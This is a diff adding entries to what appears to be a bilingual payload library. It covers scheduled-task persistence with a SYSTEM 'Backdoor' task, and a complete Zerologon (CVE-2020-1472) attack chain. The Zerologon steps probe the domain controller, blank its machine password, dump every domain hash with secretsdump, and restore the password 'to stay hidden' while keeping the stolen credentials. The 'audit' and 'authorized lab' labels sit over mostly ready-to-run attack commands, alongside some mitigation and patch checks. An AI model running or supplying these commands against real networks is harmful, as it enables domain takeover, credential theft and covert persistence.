+     "title": {
+      "zh": "运行一条计划任务持久化安全核对验证命令",
+      "en": "Run One Safe Scheduled-Task Persistence Review Validation Command"
+     },
+     "description": {
+      "zh": "只在授权实验中运行 计划任务持久化安全核对 的第一条已审查命令，保存原始输出、时间戳、目标端日志和回滚状态，不串联其他动作。",
+      "en": "Run only the first reviewed Safe Scheduled-Task Persistence Review command in the authorized lab, preserving raw output, timestamps, target-side logs, and rollback state without chaining other actions."
+     },
+     "payload": "schtasks /create /tn \"Backdoor\" /tr \"C:\\backdoor.exe\" /sc onlogon /ru SYSTEM"
+    },
+    {
+     "title": {
+      "zh": "关联计划任务持久化安全核对权威证据",
+      "en": "Correlate Authoritative Safe Scheduled-Task Persistence Review Evidence"
+     },
+     "description": {
+      "zh": "关联任务路径、触发器、运行身份、动作路径、文件 ACL、变更审批和系统日志，不执行动作或注册新任务。",
+      "en": "Correlate task path, trigger, run identity, action path, file ACL, change approval, and system logs without executing an action or registering a new task."
+     }
+    },
+    {
+     "title": {
+      "zh": "执行修复并做回归验证",
+      "en": "Remediate and Retest Safe Scheduled-Task Persistence Review"
+     },
+     "description": {
+      "zh": "完成 计划任务持久化安全核对 对应的最小权限、补丁或配置修复后，以相同主体和同一条命令回归，确认正常管理能力保留且原证据链不再成立。",
+      "en": "After the least-privilege, patch, or configuration remediation for Safe Scheduled-Task Persistence Review, retest with the same principal and command to confirm legitimate administration remains available and the original evidence chain no longer holds."
+     },
+     "payload": "crontab -e"
+    }
+   ],
+   "references": [
+    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks",
+    "https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask",
+    "https://attack.mitre.org/techniques/T1053/005/"
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖计划任务持久化安全核对场景，检验登录触发、周期触发与跨平台注册的任务植入面。验证维度含 schtasks 登录与定时任务、PowerShell 注册与 crontab 编辑四步，对应第 1 至第 4 步。",
+     "en": "This payload covers scheduled-task persistence safety checks, testing implantation across logon-triggered, interval-triggered and cross-platform registration. Validation covers schtasks logon and interval tasks, PowerShell registration and crontab editing, mapped to steps 1 through 4."
+    },
+    "vulnerability": {
+     "zh": "根因在于计划任务以定义者权限自动执行且名称可伪装系统任务：SYSTEM 触发任务与分钟级周期任务落盘后长期驻留，蓝队若无任务基线则难以定位。",
+     "en": "The root cause is scheduled tasks auto-executing with their definer's privileges behind spoofable system-like names: SYSTEM-triggered and minute-interval tasks persist on disk indefinitely, hard to spot without a task baseline."
+    },
+    "exploitation": {
+     "zh": "第 1 步用 schtasks 创建 SYSTEM 登录触发任务并回读确认；第 2 步创建 5 分钟间隔任务验证周期执行；第 3 步以 PowerShell 注册同义任务确认两接口痕迹一致；第 4 步在测试环境打开 crontab 核对 Linux 侧用户级任务。以任务回读与执行记录为判据。占位符在全局变量菜单替换；测试后删除全部任务。",
+     "en": "In step 1, create a SYSTEM logon-trigger task with schtasks and confirm via read-back. In step 2, create a 5-minute interval task verifying periodic runs. In step 3, register an equivalent task with PowerShell confirming consistent artifacts. In step 4, open crontab in the test environment for the Linux side. Judge by task read-back and execution records. Replace placeholders via the global variables menu; delete all tasks after testing."
+    },
+    "mitigation": {
+     "zh": "以任务清单为基线监控创建/修改事件（4698/4699），约束非管理员创建 SYSTEM 触发任务：\n    auditpol /set /subcategory:\"Other Object Access Events\" /success /failure\n    schtasks /query /fo csv /v > C:\\baseline\\tasks.csv\n    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698,4699} -MaxEvents 50",
+     "en": "Baseline the task inventory and monitor creation and modification events (4698, 4699), blocking non-administrators from creating SYSTEM-triggered tasks. After the fix, replay steps 1 and 2: creation should alert instantly and stand out in baseline diffs."
+    },
+    "difficulty": "intermediate"
+   },
+   "analysis": {
+    "zh": "报告应记录任务/条目、主体、触发时间、动作文件、权限差异和清理证据；命令帮助或现有任务名称不能单独证明持久化漏洞。",
+    "en": "Reports should record the task or entry, principal, trigger time, action file, permission delta, and cleanup evidence; command help or an existing task name alone does not prove a persistence vulnerability."
+   },
+   "review": {
+    "decision": "payload",
+    "rationale": "N-0018：C4 标题从序列化 JSON 还原；C3/C1 置空与标题不符的错位挂载（C1 系同类矛盾外推，已报备）。"
+   }
+  },
+  {
+   "id": "zerologon",
+   "name": {
+    "zh": "Zerologon 补丁与协议配置审计",
+    "en": "Zerologon Patch and Protocol Configuration Audit"
+   },
+   "description": {
+    "zh": "经 Netlogon 缺陷置空域控机器账户密码并导出全域哈希，完成后恢复密码，验证 CVE-2020-1472 全链影响与恢复能力。",
+    "en": "Zero the DC machine account password via the Netlogon flaw, dump domain hashes, then restore the password, verifying the full CVE-2020-1472 chain impact and recovery."
+   },
+   "category": {
+    "zh": "Active Directory 安全边界",
+    "en": "Active Directory Security Boundaries"
+   },
+   "subCategory": {
+    "zh": "域控漏洞与已知利用链",
+    "en": "DC Vulnerabilities & Known Exploit Chains"
+   },
+   "tags": [
+    "zerologon",
+    "cve-2020-1472",
+    "domain"
+   ],
+   "prerequisites": [
+    {
+     "zh": "确认 Zerologon 补丁与协议配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。",
+     "en": "Confirm that the lab domain, host, account, component version, and stop conditions for Zerologon Patch and Protocol Configuration Audit are authorized in writing and reversible."
+    },
+    {
+     "zh": "准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。",
+     "en": "Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization."
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "探测 Zerologon 补丁",
+      "en": "Zerologon Patch and Protocol Configuration Audit Reviewed Command 1"
+     },
+     "command": "python zerologon_tester.py {DC_HOST} {DC_IP}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_DOMAIN_ZEROLOGON_E_1 与蓝队日志；成功时 tester 输出 Success，确认域控未打补丁。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_DOMAIN_ZEROLOGON_E_1 with blue-team logs; the tester printing Success confirms the DC is unpatched."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "zerologon_tester.py",
+       "explanation": {
+        "zh": "漏洞探测脚本",
+        "en": "vulnerability tester"
+       },
+       "type": "function"
+      },
+      {
+       "part": "{DC_HOST}",
+       "explanation": {
+        "zh": "域控主机名",
+        "en": "DC hostname"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{DC_IP}",
+       "explanation": {
+        "zh": "域控地址",
+        "en": "DC address"
+       },
+       "type": "value"
+      },
+      {
+       "part": "python",
+       "explanation": {
+        "zh": "脚本解释器",
+        "en": "script interpreter"
+       },
+       "type": "function"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "置空域控机器密码",
+      "en": "Zerologon Patch and Protocol Configuration Audit Reviewed Command 2"
+     },
+     "command": "python zerologon_exploit.py {DC_HOST} {DC_IP}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_DOMAIN_ZEROLOGON_E_2 与蓝队日志；成功时 exploit 将域控密码置空并输出成功信息。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_DOMAIN_ZEROLOGON_E_2 with blue-team logs; the exploit emptying the DC password and printing success confirms execution."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "zerologon_exploit.py",
+       "explanation": {
+        "zh": "利用脚本",
+        "en": "Exploitation script"
+       },
+       "type": "keyword"
+      },
+      {
+       "part": "DC_NAME",
+       "explanation": {
+        "zh": "域控制器名称",
+        "en": "Domain Controller Name"
+       },
+       "type": "keyword"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "空密码导出域哈希",
+      "en": "Zerologon Patch and Protocol Configuration Audit Reviewed Command 3"
+     },
+     "command": "secretsdump.py -just-dc -no-pass {LAB_DOMAIN}/{DC_HOST}$@{DC_IP}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_DOMAIN_ZEROLOGON_E_3 与蓝队日志；成功时 secretsdump 以空密码导出全部域哈希。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_DOMAIN_ZEROLOGON_E_3 with blue-team logs; secretsdump exporting all domain hashes with the empty password confirms success."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "secretsdump.py",
+       "explanation": {
+        "zh": "Impacket哈希转储",
+        "en": "Impacket hash dumper"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-just-dc",
+       "explanation": {
+        "zh": "仅域数据",
+        "en": "dump domain data only"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "-no-pass",
+       "explanation": {
+        "zh": "空口令认证",
+        "en": "no password auth"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "{LAB_DOMAIN}/{DC_HOST}$@{DC_IP}",
+       "explanation": {
+        "zh": "机器账号目标",
+        "en": "machine account target"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "恢复域控原始密码",
+      "en": "Zerologon Patch and Protocol Configuration Audit Reviewed Command 4"
+     },
+     "command": "python zerologon_restore.py {DC_HOST} {DC_IP} {LAB_NTLM_HASH}",
+     "description": {
+      "zh": "在隔离授权环境运行并关联 PAYLOADER_DOMAIN_ZEROLOGON_E_4 与蓝队日志；成功时 restore 脚本用原始哈希恢复域控密码并输出恢复成功。",
+      "en": "Run in the isolated authorization and correlate PAYLOADER_DOMAIN_ZEROLOGON_E_4 with blue-team logs; the restore script recovering the DC password with the original hash and printing success confirms restoration."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "python zerologon_restore.py",
+       "explanation": {
+        "zh": "密码恢复脚本",
+        "en": "password restore script"
+       },
+       "type": "function"
+      },
+      {
+       "part": "{LAB_NTLM_HASH}",
+       "explanation": {
+        "zh": "原始机器哈希",
+        "en": "original machine hash"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{DC_HOST} {DC_IP}",
+       "explanation": {
+        "zh": "目标域控信息",
+        "en": "target DC info"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    }
+   ],
+   "opsecTips": [
+    {
+     "zh": "一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。",
+     "en": "Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data."
+    },
+    {
+     "zh": "发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。",
+     "en": "Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization."
+    }
+   ],
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "补丁级别审计变体",
+      "en": "Patch-Level Audit Variant"
+     },
+     "command": "wmic qfe get HotFixID,InstalledOn | findstr /i \"4571694 4571723 4571748\"",
+     "description": {
+      "zh": "零网络爆破噪声：纯补丁枚举判定 Zerologon 修复状态；未列出对应 KB 即存在风险面。",
+      "en": "Determine patch state purely via KB enumeration with zero network brute-force noise; missing KBs indicate the exposed surface."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "wmic qfe get HotFixID,InstalledOn",
+       "explanation": {
+        "zh": "枚举补丁",
+        "en": "list hotfixes"
+       },
+       "type": "function"
+      },
+      {
+       "part": "|",
+       "explanation": {
+        "zh": "管道过滤",
+        "en": "pipe to filter"
+       },
+       "type": "operator"
+      },
+      {
+       "part": "findstr /i \"4571694 4571723 4571748\"",
+       "explanation": {
+        "zh": "筛修复KB",
+        "en": "filter patch KBs"
+       },
+       "type": "function"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "RPC 端点指纹替代",
+      "en": "RPC Endpoint Fingerprint Alternative"
+     },
+     "command": "rpcdump.py {DC_IP} | grep -iE \"MS-NRPC|Netlogon\"",
+     "description": {
+      "zh": "以端点枚举替代认证爆破探测 Netlogon 面；输出 MS-NRPC UUID 即接口可达。",
+      "en": "Probe the Netlogon surface via endpoint enumeration instead of auth brute force; printed MS-NRPC UUIDs confirm interface reachability."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "rpcdump.py",
+       "explanation": {
+        "zh": "RPC端点枚举",
+        "en": "RPC endpoint dumper"
+       },
+       "type": "function"
+      },
+      {
+       "part": "{DC_IP}",
+       "explanation": {
+        "zh": "目标域控",
+        "en": "target DC"
+       },
+       "type": "value"
+      },
+      {
+       "part": "grep -iE \"MS-NRPC|Netlogon\"",
+       "explanation": {
+        "zh": "筛Netlogon接口",
+        "en": "filter Netlogon iface"
+       },
+       "type": "function"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "注册表签名策略审计",
+      "en": "Registry Signing Policy Audit"
+     },
+     "command": "powershell -NoProfile -Command \"Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters' | Select-Object RequireSignOrSeal,SignSecureChannel\"",
+     "description": {
+      "zh": "完全离线检查通道签名强制配置；RequireSignOrSeal 为 0 或缺省即防御未强制。",
+      "en": "Fully offline check of channel-signing enforcement; RequireSignOrSeal at 0 or absent confirms the defense is not enforced."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "powershell -NoProfile -Command",
+       "explanation": {
+        "zh": "无配置执行命令",
+        "en": "run command, no profile"
+       },
+       "type": "function"
+      },
+      {
+       "part": "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters'",
+       "explanation": {
+        "zh": "读Netlogon参数",
+        "en": "read Netlogon params"
+       },
+       "type": "function"
+      },
+      {
+       "part": "RequireSignOrSeal,SignSecureChannel",
+       "explanation": {
+        "zh": "签名策略字段",
+        "en": "signing policy fields"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ],
+   "attackChain": [
+    {
+     "title": {
+      "zh": "检测域控漏洞状态",
+      "en": "Test the DC for Zerologon"
+     },
+     "description": {
+      "zh": "运行 zerologon_tester.py 指定 DC 名称与 IP；输出域控可被完全攻陷的结论即确认存在 CVE-2020-1472。",
+      "en": "Run zerologon_tester.py against the DC name and IP; a fully-compromisable verdict confirms CVE-2020-1472 is present."
+     },
+     "payload": "python zerologon_tester.py {DC_HOST} {DC_IP}"
+    },
+    {
+     "title": {
+      "zh": "置空域控机器账号口令",
+      "en": "Blank the DC machine account password"
+     },
+     "description": {
+      "zh": "运行 zerologon_exploit.py 重置 DC$ 口令为空；返回目标 NETBIOS 名即域控身份校验已被密码学缺陷攻破。",
+      "en": "Run zerologon_exploit.py to blank the DC$ password; the target NETBIOS name returned means the cryptographic flaw broke DC authentication."
+     },
+     "payload": "python zerologon_exploit.py {DC_HOST} {DC_IP}"
+    },
+    {
+     "title": {
+      "zh": "无口令倾倒全域凭据",
+      "en": "Dump all domain credentials"
+     },
+     "description": {
+      "zh": "用 secretsdump.py -just-dc -no-pass 以 DC$ 空口令登录导出；输出 administrator 与 krbtgt 哈希即接管域控凭据库。",
+      "en": "Dump with secretsdump.py -just-dc -no-pass on the blanked DC$; administrator and krbtgt hashes in hand mean the DC credential store is taken."
+     },
+     "payload": "secretsdump.py -just-dc -no-pass {LAB_DOMAIN}/{DC_HOST}$@{DC_IP}"
+    },
+    {
+     "title": {
+      "zh": "恢复口令稳固控制",
+      "en": "Restore the password to stay hidden"
+     },
+     "description": {
+      "zh": "用 zerologon_restore.py 配合原机器账号哈希恢复 DC$ 口令；恢复成功即避免域复制崩溃，同时保留已导出凭据的控制权。",
+      "en": "Restore the DC$ password with zerologon_restore.py and the original hash; success avoids replication breakage while the dumped credentials keep control."
+     },
+     "payload": "python zerologon_restore.py {DC_HOST} {DC_IP} {LAB_NTLM_HASH}"
+    }
+   ],
+   "references": [
+    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory",
+    "https://attack.mitre.org/tactics/TA0008/"
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "Zerologon 补丁与协议配置审计覆盖 Netlogon 特权提升场景：针对未安装 2020-08 补丁且未开启强制模式的域控，验证 CVE-2020-1472 加密缺陷是否可被利用。验证维度涵盖漏洞探测、机器账户密码置空、空凭据哈希导出与密码恢复四步闭环。",
+     "en": "Zerologon Patch and Protocol Configuration Audit covers Netlogon privilege escalation: for DCs without the 2020-08 patch or enforcement mode, verify whether the CVE-2020-1472 cryptographic flaw is exploitable. Verification dimensions form a four-step loop: vulnerability probing, machine-account password nulling, hash export with empty credentials, and password restoration."
+    },
+    "vulnerability": {
+     "zh": "根因是 MS-NRPC 使用 AES-CFB8 且 IV 固定为全零（CVE-2020-1472）：攻击者利用固定 IV 可计算出通过校验的 ClientCredential，从而伪造 NetrServerPasswordSet2 请求；未修补域控接受该请求后将自身机器账户密码置空，攻击者随即以空凭据完成 DRSUAPI 复制导出全量域哈希。",
+     "en": "The root cause is MS-NRPC's NetrServerPasswordSet2 using a cryptographically forgeable all-zero IV and session key (CVE-2020-1472); an unpatched DC accepts the forged request and nulls its own machine-account password, after which the attacker performs DRSUAPI replication with empty credentials to export every domain hash."
+    },
+    "exploitation": {
+     "zh": "按 Payload 列表顺序使用：第 1 步运行 zerologon_tester 探测，输出 Success 即确认域控未修补；第 2 步运行 exploit 将域控机器账户密码置空；第 3 步用 secretsdump -no-pass 以空密码导出全部域哈希（含 krbtgt）；第 4 步必须运行 restore 脚本以原始哈希恢复域控密码，否则机器账户密码与目录记录不一致，安全通道与域复制将中断。全流程仅在书面授权环境执行。LAB_* 占位符在全局变量菜单中替换为目标值。",
+     "en": "Use in Payload list order: step 1 probes with zerologon_tester — Success output confirms the DC is unpatched; step 2 runs the exploit to null the DC machine-account password; step 3 exports all domain hashes (including krbtgt) with secretsdump -no-pass using empty credentials; step 4 must run the restore script to recover the DC password from the saved hash, or the DC loses AD synchronization. Execute the entire flow only in written-authorized environments. Replace LAB_* placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "全部域控安装 2020-08+ 安全更新并开启 Netlogon 强制模式拒绝脆弱连接（2021-02 后补丁默认强制，手动写值仅用于旧补丁窗口期），监控 5827-5831，升级后两阶段轮换 krbtgt：\n    reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\" /v FullSecureChannelProtection /t REG_DWORD /d 1 /f\n    nltest /sc_query:{LAB_DOMAIN}\n    Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='NETLOGON';Id=(5827..5831)} -MaxEvents 20",
+     "en": "Install 2020-08+ security updates on all DCs and enable Netlogon enforcement mode to reject vulnerable connections, monitoring 5827-5831 Netlogon rejection events; rotate krbtgt in two passes after remediation. After the fix, regress with the step 1 sample: the tester must report non-exploitability."
+    },
+    "difficulty": "advanced"
+   },
+   "analysis": {
+    "zh": "Zerologon 补丁与协议配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。",
+    "en": "Zerologon Patch and Protocol Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately."
+   },
+   "review": {
+    "decision": "payload",
+    "rationale": "N-0019：修复注册表值名 FullSecureChannelSupport→FullSecureChannelProtection，并补注补丁窗口期说明。"
+   }
+  }
+ ]
+}
